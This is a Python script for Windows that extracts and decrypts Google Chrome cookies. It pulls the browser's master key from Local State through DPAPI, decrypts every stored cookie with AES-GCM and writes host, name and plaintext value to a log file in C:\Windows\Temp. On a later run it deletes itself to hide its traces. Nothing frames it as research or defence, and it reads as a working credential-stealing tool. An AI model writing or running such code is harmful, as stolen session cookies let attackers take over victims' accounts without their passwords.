import os
import sqlite3
import shutil
import json
import base64
import sys
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def get_decryption_key():
    local_state_path = os.path.join(
        os.environ['LOCALAPPDATA'], "Google", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def get_all_cookies(output_path):
    db_path = os.path.join(
        os.environ['LOCALAPPDATA'], "Google", "User Data", "Default", "Network", "Cookies"
    )
    temp_db = os.path.join(os.getenv("TEMP"), "temp_cookies_db")
    shutil.copy2(db_path, temp_db)
    key = get_decryption_key()
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    with open(output_path, "w", encoding="utf-8") as out_file:
        for host_key, name, encrypted_value in cursor.fetchall():
            try:
                nonce = encrypted_value[3:15]
                cipher = encrypted_value[15:]
                aesgcm = AESGCM(key)
                value = aesgcm.decrypt(nonce, cipher, None).decode()
            except:
                value = "[Decryption Failed]"
            out_file.write(f"{host_key}\\t{name}\\t{value}\\n")
    cursor.close()
    conn.close()
    os.remove(temp_db)

def delete_self():
    this_file = os.path.abspath(sys.argv[0])
    try:
        os.remove(this_file)
    except Exception:
        pass

if __name__ == "__main__":
    output_file = r"C:\\Windows\\Temp\\LOGS"
    if os.path.exists(output_file):
        delete_self()
    else:
        get_all_cookies(output_file)
